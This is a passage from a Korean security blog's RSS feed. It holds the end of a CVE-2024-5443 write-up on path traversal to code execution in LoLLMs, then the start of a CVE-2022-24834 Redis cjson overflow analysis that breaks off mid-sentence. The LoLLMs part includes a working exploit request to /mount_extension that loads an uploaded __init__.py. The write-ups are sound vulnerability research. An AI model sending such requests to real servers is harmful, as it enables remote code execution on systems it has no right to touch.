&#xC874;&#xC7AC;&#xD558;&#xBA74;<code>package_full_path</code>&#xAC00; <code>lollmsElfServer.config[&quot;extensions&quot;]</code>&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4; [7]&#xBC88;&#xC5D0;&#xC11C; <code>lollmsElfServer.rebuild_extensions()</code> &#xD568;&#xC218;&#xAC00; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># lollms_webui.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LOLLMSWebUI</span>(<span class="hljs-title">LOLLMSElfServer</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebuild_extensions</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, reload_all=False)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-comment"># ...</span>        <span class="hljs-keyword">for</span> i, extension <span class="hljs-keyword">in</span> enumerate(<span class="hljs-keyword">self</span>.config[<span class="hljs-string">&apos;extensions&apos;</span>])<span class="hljs-symbol">:</span>            <span class="hljs-comment"># ...</span>            <span class="hljs-keyword">if</span> extension <span class="hljs-keyword">in</span> <span class="hljs-symbol">loaded_names:</span>                <span class="hljs-comment"># ...</span>            <span class="hljs-symbol">else:</span>                extension_path = <span class="hljs-keyword">self</span>.lollms_paths.extensions_zoo_path / f<span class="hljs-string">&quot;{extension}&quot;</span>                <span class="hljs-symbol">try:</span>                    extension = ExtensionBuilder().build_extension(extension_path, <span class="hljs-keyword">self</span>.lollms_paths, <span class="hljs-keyword">self</span>)                <span class="hljs-comment"># ...</span></code></pre><p>[5]&#xBC88;&#xC5D0;&#xC11C; &#xCD94;&#xAC00;&#xB41C; &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xBAA8;&#xB4E0; <code>extension_path</code>&#xB97C; &#xBC18;&#xBCF5;&#xD558;&#xBA74;&#xC11C;, <code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-comment"># lollms_core\lollms\extension.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExtensionBuilder</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">build_extension</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">self</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">extension_path:</span> str,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">lollms_paths:</span> LollmsPaths,</span></span><span class="hljs-function"><span class="hljs-params">        app,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">installation_option:</span> InstallOption = InstallOption.INSTALL_IF_NECESSARY</span></span><span class="hljs-function"><span class="hljs-params">    )</span></span> -&gt; <span class="hljs-symbol">LOLLMS_Extension:</span>        extension, script_path = <span class="hljs-keyword">self</span>.getExtension(extension_path, lollms_paths, app)  <span class="hljs-comment"># [8]</span>        <span class="hljs-keyword">return</span> extension(app=app, installation_option=installation_option)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getExtension</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">self</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">extension_path:</span> str,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-symbol">lollms_paths:</span> LollmsPaths,</span></span><span class="hljs-function"><span class="hljs-params">        app</span></span><span class="hljs-function"><span class="hljs-params">    )</span></span> -&gt; <span class="hljs-symbol">LOLLMS_Extension:</span>        extension_path = lollms_paths.extensions_zoo_path / extension_path        <span class="hljs-comment"># &#xBAA8;&#xB4C8;&#xC758; &#xC804;&#xCCB4; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xC815;&#xC758;</span>        absolute_path = extension_path.resolve()        <span class="hljs-comment"># &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xBAA8;&#xB4C8; &#xC774;&#xB984; &#xCD94;&#xCD9C;</span>        module_name = extension_path.stem        <span class="hljs-comment"># importlib&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xBAA8;&#xB4C8; &#xB85C;&#xB4DC;</span>        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / <span class="hljs-string">&quot;__init__.py&quot;</span>))  <span class="hljs-comment"># [9]</span>        extension_module = loader.load_module()        <span class="hljs-symbol">extension:</span> LOLLMS_Extension = getattr(extension_module, extension_module.extension_name)        <span class="hljs-keyword">return</span> extension, absolute_path</code></pre><p><code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;, [8]&#xBC88;&#xC5D0;&#xC11C; <code>ExtensionBuilder().getExtension()</code> &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>extension_path</code>&#xB294; &#xACF5;&#xACA9;&#xC790; &#xC808;&#xB300; &#xACBD;&#xB85C; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574;, <code>absolute_path</code> &#xBCC0;&#xC218;&#xC758; &#xAC12;&#xC744; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xD6C4;, [9]&#xBC88;&#xC5D0;&#xC11C; <code>ExtensionBuilder().getExtension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC9C0;&#xC815;&#xD55C; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/21/ogu123/cve-2024-5443/image1.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD558;&#xAE30; &#xC704;&#xD574; &#xBA3C;&#xC800; &#xC784;&#xC758;&#xC758; &#xB300;&#xD654;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4;, <code>config.yaml</code>&#xACFC; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC744; &#x201C;Send file to AI&#x201D; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC11C;&#xBC84;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs groovy">POST <span class="hljs-regexp">/mount_extension HTTP/</span><span class="hljs-number">1.1</span><span class="hljs-attr">Host:</span> <span class="hljs-attr">localhost:</span><span class="hljs-number">1337</span>Content-<span class="hljs-attr">Type:</span> application/jsonContent-<span class="hljs-attr">Length:</span> <span class="hljs-number">177</span>{ <span class="hljs-string">&quot;category&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;folder&quot;</span>: <span class="hljs-string">&quot;/path/to/personal_data/discussion_databases/default/&lt;discussion_id&gt;/text_data&quot;</span>, <span class="hljs-string">&quot;client_id&quot;</span>: <span class="hljs-string">&quot;jg9yock1FmRZdONsAAAH&quot;</span>, <span class="hljs-string">&quot;language&quot;</span>: <span class="hljs-string">&quot;vi&quot;</span>}</code></pre><p>&#xC5C5;&#xB85C;&#xB4DC;&#xB41C; <code>config.yaml</code>&#xACFC; <code>__init__.py</code> &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xC5EC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74;, <code>__init__.py</code> &#xD30C;&#xC77C; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xB54C;, <code>discussion_id</code>&#xAC12;&#xC774; &#xD544;&#xC694;&#xD558;&#xC9C0;&#xB9CC; &#xC815;&#xC218;&#xAC12;&#xC774;&#xBBC0;&#xB85C; brute-force &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC27D;&#xAC8C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/21/ogu123/cve-2024-5443/image2.png" alt></p><p><code>__init__.py</code> &#xD30C;&#xC77C; &#xB0B4;&#xC5D0;&#xC11C; calc.exe &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>lollms_extensions_infos.py</code> &#xD30C;&#xC77C;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xC5EC; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f#diff-a439c41fae59a1b420f981f6a87c9ce17432a89dbc6165c89002894a52fdec1e">https://github.com/parisneo/lollms/commit/2d0c4e76be93195836ecd0948027e791b8a2626f#diff-a439c41fae59a1b420f981f6a87c9ce17432a89dbc6165c89002894a52fdec1e</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Path-Traversal/">Path Traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/ogu123/">ogu123</category>
      
      <category domain="https://hackyboiz.github.io/tags/RCE/">RCE</category>
      
      <category domain="https://hackyboiz.github.io/tags/LoLLMs/">LoLLMs</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 1day1document : CVE-2022-24834</title>
      <link>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/</link>
      <guid>https://hackyboiz.github.io/2024/08/18/pwndorei/1day1document_CVE-2022-24834/</guid>
      <pubDate>Sun, 18 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC13</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, pwndorei&#xC785;&#xB2C8;&#xB2E4;. &#xB610; &#xB2E4;&#xC2DC; &#xC5F0;&#xAD6C;&#xAE00;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xBC88;&#xC5D0;&#xB294; Redis&#xC785;&#xB2C8;&#xB2E4;!  Redis&#xBA74; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC778;&#xB370; &#xB9C9; query&#xB97C; &#xB0A0;&#xB9B0;&#xB2E4;&#xAC70;&#xB098; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;&#xAC70;&#xB098; &#xADF8;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC544;&#xB2C8;&#xACE0;&#xC694; &#x314B;&#x314B;&#x314B;&#x314B; &#xC624;&#xD788;&#xB824; &#xC804;&#xC5D0; &#xB2E4;&#xB8EC; Adobe &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xD2BC; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC81C;&#xBAA9;&#xC5D0; &#xC4F0;&#xC5EC;&#xC788;&#xB294; &#xAC83;&#xCC98;&#xB7FC; CVE-2022-24834 &#xBD84;&#xC11D; &#xBC0F; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC774;&#xACE0; &#xC800;&#xBC88;&#xCC98;&#xB7FC; &#xC54C;&#xCC28;&#xAC8C; &#xB2F4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2024/08/18/pwndorei/1day1document_CVE-2022-24834/90n64h.gif" alt="90n64h.gif"></p><blockquote><p><del>&#xB108;&#xBB34; &#xC54C;&#xCC28;&#xC11C; &#xC0AC;&#xACE0; &#xC815;&#xC9C0;&#xB418;&#xC5B4;&#xB3C4; &#xC804; &#xBAA8;&#xB985;&#xB2C8;&#xB354;</del></p></blockquote><h1 id="1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;"><a href="#1-&#xCDE8;&#xC57D;&#xC810;-&#xC815;&#xBCF4;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;"></a>1. &#xCDE8;&#xC57D;&#xC810; &#xC815;&#xBCF4;</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>CVE-2022-24834&#xB294; in-memory &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC778; Redis&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Lua &#xC2A4;&#xD06C;&#xB9BD;&#xD305;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294; Redis&#xC5D0;&#xC11C; &#xACF5;&#xD1B5;&#xC801;&#xC73C;&#xB85C; &#xBC1C;&#xACAC;&#xB41C; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBA70; Lua&#xC5D0;&#xC11C; JSON &#xC778;&#xCF54;&#xB529; &#xBC0F; &#xD30C;&#xC2F1;&#xC744; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC778; cjson&#xC5D0;&#xC11C; Integer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD55C; &#xAC83;&#xC774; &#xC6D0;&#xC778;&#xC774;&#xACE0; Redis Server&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xACE0; Lua Script&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xBC84;&#xADF8;&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; Integer Overflow&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Heap Overflow&#xB85C; Remote Code Execution&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. </p><h2 id="Affected-Product-amp-Version-Information"><a href="#Affected-Product-amp-Version-Information" class="headerlink" title="Affected Product &amp; Version Information"></a>Affected Product &amp; Version Information</h2><ul><li>Redis<ul><li>7.0.0 &#x2264; version &lt; 7.0.12</li><li>6.2.0 &#x2264; version &lt; 6.2.13</li><li>2.6.0 &#x2264; version &lt; 6.0.20</li></ul></li></ul><h1 id="2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;"><a href="#2-&#xCDE8;&#xC57D;&#xC810;-&#xBD84;&#xC11D;" class="headerlink" title="2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;"></a>2. &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;</h1><hr><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; Redis&#xC758; Lua&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC778; cjson&#xC758; <code>json_append_string</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xBAA8;&#xB4E0; &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xB3D9;&#xC77C;&#xD55C; Root cause&#xB97C; &#xAC00;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h2 id="json-append-string"><a href="#json-append-string" class="headerlink" title="json_append_string"></a><code>json_append_string</code></h2><p>&#xC774; &#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">/* json_append_string args:</span><span class="hljs-comment"> * - lua_State</span><span class="hljs-comment"> * - JSON strbuf</span><span class="hljs-comment"> * - String (Lua stack index)</span><span class="hljs-comment"> *</span><span class="hljs-comment"> * Returns nothing. Doesn&apos;t remove string from Lua stack */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">json_append_string</span><span class="hljs-params">(lua_State *l, <span class="hljs-keyword">strbuf_t</span> *json, <span class="hljs-keyword">int</span> lindex)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *escstr;    <span class="hljs-keyword">int</span> i;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *str;    <span class="hljs-keyword">size_t</span> len;    str = lua_tolstring(l, lindex, &amp;len);<span class="hljs-comment">// [1]</span>    <span class="hljs-comment">/* Worst case is len * 6 (all unicode escapes).</span><span class="hljs-comment">     * This buffer is reused constantly for small strings</span><span class="hljs-comment">     * If there are any excess pages, they won&apos;t be hit anyway.</span><span class="hljs-comment">     * This gains ~5% speedup. */</span>    strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    <span class="hljs-comment">// [2]</span>    strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);     // [3]    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {        escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];        <span class="hljs-keyword">if</span> (escstr)            strbuf_append_string(json, escstr);        <span class="hljs-keyword">else</span>            strbuf_append_char_unsafe(json, str[i]);    }    strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC740; Lua&#xC758; &#xBB38;&#xC790;&#xC5F4; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; JSON &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB97C; &#xD06C;&#xAC8C; <code>[1]</code>, <code>[2]</code>, <code>[3]</code>&#xC758; &#xC138; &#xB2E8;&#xACC4;&#xB85C; &#xB098;&#xB204;&#xC5B4; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-Lua-String-&#x2192;-C-String"><a href="#1-Lua-String-&#x2192;-C-String" class="headerlink" title="1. Lua String &#x2192; C String"></a>1. Lua String &#x2192; C String</h3><pre><code class="hljs c">str = lua_tolstring(l, lindex, &amp;len);<span class="hljs-comment">// [1]</span></code></pre><p>&#xCCAB; &#xBC88;&#xC9F8; &#xC778;&#xC790; <code>lua_State *l</code>&#xACFC; &#xB450; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xC778; <code>int lindex</code>&#xB97C; &#xC778;&#xC790;&#xB85C; <code>lua_tolstring</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC774;&#xB294; &#xC778;&#xCF54;&#xB529;&#xD560; Lua &#xBB38;&#xC790;&#xC5F4;&#xC744; C &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xC5EC; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. C &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB294; &#xC138; &#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB41C; <code>size_t len</code>&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-strbuf-ensure-empty-length"><a href="#2-strbuf-ensure-empty-length" class="headerlink" title="2. strbuf_ensure_empty_length"></a>2. <code>strbuf_ensure_empty_length</code></h3><pre><code class="hljs c">strbuf_ensure_empty_length(json, len * <span class="hljs-number">6</span> + <span class="hljs-number">2</span>);    <span class="hljs-comment">// [2]</span></code></pre><p>&#xC778;&#xCF54;&#xB529;&#xB41C; JSON &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC800;&#xC7A5;&#xB420; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, <code>len * 6 + 2</code> &#xD06C;&#xAE30;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xAC00; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xC774;&#xB294; &#xC778;&#xCF54;&#xB529; &#xACFC;&#xC815;&#xC5D0;&#xC11C; 1&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBB38;&#xC790;&#xAC00; Unicode Escape&#xB418;&#xBA74; <code>\uXXXX</code>&#xD615;&#xD0DC;&#xC758; &#xCD1D; 6&#xBC14;&#xC774;&#xD2B8;&#xC758; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xBCC0;&#xD658;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC73C;&#xB85C; &#xB9CC;&#xC57D; &#xC778;&#xCF54;&#xB529;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xBAA8;&#xB4E0; &#xBB38;&#xC790;&#xAC00; escape&#xB420; &#xACBD;&#xC6B0; &#xC6D0;&#xB798; &#xAE38;&#xC774;&#xC758; &#xC5EC;&#xC12F; &#xBC30;&#xAC00; &#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; 2&#xB97C; &#xB354;&#xD558;&#xB294; &#xC774;&#xC720;&#xB294; JSON &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xB9E8; &#xC55E;&#xACFC; &#xB05D;&#xC5D0; &#xCD94;&#xAC00;&#xD560; &#xB450; &#xAC1C;&#xC758; &#xC30D;&#xB530;&#xC634;&#xD45C;&#xB85C; &#xC778;&#xD574; &#xCD94;&#xAC00;&#xC801;&#xC778; 2&#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;.</p><p><code>strbuf_ensure_empty_length</code>&#xD568;&#xC218;&#xC758; &#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>strbuf_empty_length</code>&#xB85C; &#xBC18;&#xD658;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xB0A8;&#xC740; &#xACF5;&#xAC04;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xC694;&#xCCAD;&#xB41C; &#xAE38;&#xC774;&#xBCF4;&#xB2E4; &#xC791;&#xC73C;&#xBA74; <code>strbuf_resize</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC774; &#xD568;&#xC218;&#xC758; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; <code>realloc</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">strbuf_ensure_empty_length</span><span class="hljs-params">(<span class="hljs-keyword">strbuf_t</span> *s, <span class="hljs-keyword">int</span> len)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">if</span> (len &gt; strbuf_empty_length(s))        strbuf_resize(s, s-&gt;length + len);}</code></pre><h3 id="3-Unicode-Escape"><a href="#3-Unicode-Escape" class="headerlink" title="3. Unicode Escape"></a>3. Unicode Escape</h3><pre><code class="hljs c">strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);     // [3]<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) {    escstr = char2escape[(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)str[i]];    <span class="hljs-keyword">if</span> (escstr)        strbuf_append_string(json, escstr);    <span class="hljs-keyword">else</span>        strbuf_append_char_unsafe(json, str[i]);}strbuf_append_char_unsafe(json, &apos;\\&quot;&apos;);</code></pre><p><code>for</code> &#xBC18;&#xBCF5;&#xBB38;&#xC758; &#xC55E;&#xACFC; &#xB4A4;&#xC5D0;&#xC11C; &#xC30D;&#xB530;&#xC634;&#xD45C;&#xB97C; &#xD558;&#xB098;&#xC529; &#xCD94;&#xAC00;&#xD558;&#xACE0; &#xBC18;&#xBCF5;&#xBB38; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xC774;&#xD130;&#xB97C; <code>[2]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xD560;&#xB2F9;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC4F0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. escape&#xB418;&#xB294; &#xBB38;&#xC790;&#xC758; &#xACBD;&#xC6B0;, <code>strbuf_append_string</code> &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC744; &#xD1B5;&#xD574; escape&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xACE0; escape&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC790;&#xB294; <code>strbuf_append_char_unsafe</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xB2E8;&#xC21C;&#xD788; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. <code>char *char2escape[256]</code>&#xC740; &#xBAA8;&#xB4E0; &#xC544;&#xC2A4;&#xD0A4; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD55C; Unicode escape&#xB41C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB85C; escape&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBB38;&#xC790;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; NULL&#xC744; &#xAC00;&#xB9AC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>&#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC740; Integer Overflow&#xB85C; <code>[2]</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; <code>strbuf_ensure_empty_length</code>&#xD568;&#xC218; 